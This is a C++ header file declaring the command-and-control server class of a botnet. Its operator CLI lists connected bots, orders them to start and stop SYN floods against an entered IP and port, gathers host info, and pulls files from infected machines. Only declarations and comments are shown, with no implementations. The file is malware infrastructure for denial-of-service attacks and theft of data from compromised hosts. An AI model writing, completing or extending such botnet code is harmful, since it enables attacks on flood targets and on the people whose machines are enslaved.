#ifndef BOTNET_H
#define BOTNET_H

#include "Server.h"
#include <vector>


namespace botnet {

class BotnetServer : public server {
public:
	BotnetServer(int port, int max_connections, bool verbose=true);
	virtual ~BotnetServer() = default;

	/**
	* Main server proccess, starts the botnet CLI
	*/
	void Start();
	

	/**
	* When adding a command add its name to the enum Commands,
	* and to the "commands" vector below in the same order.
	* Make sure also to write a void(void) function that executes the command
	* and it to the "func_vector" below, also in the same order as the enum.
	* Code 0, keep-alive is private, and can not be called by the user.
	*/
	typedef enum { KEEP_ALIVE, PRINT_BOTS, SYN_FLOOD, STOP_FLOOD, GET_INFO, GET_FILE } Commands;
private:
	std::vector<std::string> GetCommandsList() const {
		// Keep Alive is a private code, don't list
		static std::vector<std::string> commands = {"Print Bots", "SYN Flood", "Stop Flood", "Get Info", "Get File"};
		return commands;
	};
	typedef void (BotnetServer::*CommandFunction)();
	CommandFunction GetCommandFunction(Commands command) {
		static const std::vector<CommandFunction> func_vector = {
			 &BotnetServer::KeepAlive
			, &BotnetServer::PrintBots
			, &BotnetServer::SYNFlood
			, &BotnetServer::StopFlood
			, &BotnetServer::GetInfo
			, &BotnetServer::GetFile
		};

		return func_vector[command];
	};

	/**
	* Thread responsible for getting and handling messages.
	*/
	void GetMessages();
	/**
	* Thread responsible for getting and handling connections.
	* Gets connections and checks if are really bots, before adding them to master_set.
	*/
	void GetConnections();
	/**
	* Checks if connection reveived is really a bot.
	* Send an authentication message and waits to receive a correct answer.
	* Return value: returns wether connection is a bot or not.
	*/
	bool AuthenticateBot(const tcpSocket& connection);

	/* CLI functions */
	std::string GetCLIPrompt() const;
	void BotnetCLI();


	/* Botnet commands void(void) functions */

	// Sends a keep-alive message to all connected sockets and updates master_set with who is still connected, who answered.
	void KeepAlive();
	// Prints all connected bots and their id
	void PrintBots();
	void SYNFlood();
	void StopFlood();
	void GetInfo();
	void GetFile();


	/* Botnet commands helpers */
	
	void GetFileFrom(const tcpSocket& bot, const std::string& file_path);
	std::string GetNewFileName(const std::string& file_path);

	void RemoveBot(const tcpSocket& bot_to_remove);

	/**
	* Reads IP from standard input, and returns the first legal
	* IP adress received.
	*/
	std::string ReadIP();
	/**
	* Checks if givven IP address is legal.
	* Legal IP: XXX.XXX.XXX.XXX; X >= 0; X <= 255;
	*/
	bool LegalIP(const std::string& IP_address) const;
	
	static const int ALL_BOTS = -1;
	/**
	* Reads bot id from user input and continues to read until entered a real number or '*',
	* which means all bots, in which case ALL_BOTS is returned.
	*/
	int ReadID();
	
	int ReadNumber();

	uint16_t ReadPort();
	std::deque<tcpSocket> GetBotQueue();

};


}

#endif